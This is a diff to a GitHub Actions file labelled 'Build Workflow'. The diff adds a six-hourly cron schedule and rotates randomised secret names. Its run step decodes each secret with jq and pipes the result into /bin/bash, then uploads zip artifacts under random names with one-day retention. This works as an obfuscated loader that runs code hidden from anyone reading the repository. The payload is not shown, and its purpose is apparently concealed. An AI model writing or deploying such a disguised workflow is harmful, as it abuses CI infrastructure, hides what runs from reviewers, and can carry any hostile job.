@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '3 0,6,12,18 * * *'
 jobs:
   action:
     runs-on: ubuntu-latest
@@ -9,16 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Begin
         env:
-          xrtij30056: ${{ secrets.xrtij30056 }}
+          opdg4: ${{ secrets.opdg4 }}
         run: |
-          printf '%s' "$xrtij30056" | jq -r .krzpd6017 | /bin/bash
-          echo $dawbk9593 | jq -r .majis5 | /bin/bash
-          printf '%s' "$ni5" | jq -r .yq0 | /bin/bash
-          printf '%s' "$pd31" | jq -r .srogz0707 | /bin/bash
+          printf '%s' "$opdg4" | jq -r .shry20035 | /bin/bash
+          printf '%s' "$xdzdo091" | jq -r .yokn22005 | /bin/bash
+          echo $mggb11 | jq -r .v10281 | /bin/bash
+          printf '%s' "$nfqw999" | jq -r .qt7821 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: 9lwnRqr9
+          name: APiAV3pK
           path: "*.zip"
           retention-days: 1
